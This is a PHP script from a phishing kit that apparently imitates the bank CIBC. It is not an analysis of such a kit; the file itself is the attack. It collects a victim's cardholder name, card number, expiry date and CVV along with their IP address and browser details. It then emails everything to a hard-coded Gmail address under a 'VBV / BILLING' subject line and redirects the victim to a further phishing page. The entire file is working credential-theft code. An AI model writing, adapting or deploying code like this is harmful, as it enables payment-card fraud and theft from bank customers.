<?php

error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;

$_SESSION['cardholdername'] = $_GET['cardholdername'];
$_SESSION['cardNumber'] = $_GET['cardNumber'];
$_SESSION['edmonth'] = $_GET['edmonth'];
$_SESSION['edyear'] = $_GET['edyear'];
$_SESSION['cvn'] = $_GET['cvn'];


#Security information

$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
CARD Name     =>     <font color='#F31414'>".$_SESSION['cardholdername']."</font><br />
CARD NUMBER     =>   <font color='#F31414'>".$_SESSION['cardNumber']."</font><br />
EXPIRATION DATE =>   <font color='#F31414'>".$_SESSION['edmonth']."-".$_SESSION['edyear']."</font><br />
CVV / CVC       =>   <font color='#F31414'>".$_SESSION['cvn']."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$subject  = " CIBC :  VBV / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-Int" . "\r\n";
$to = "goodvbesk1@gmail.com";
@mail($to,$subject,$message,$headers);

 
 header("location:../vbv.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        
		  
		  
		  ?>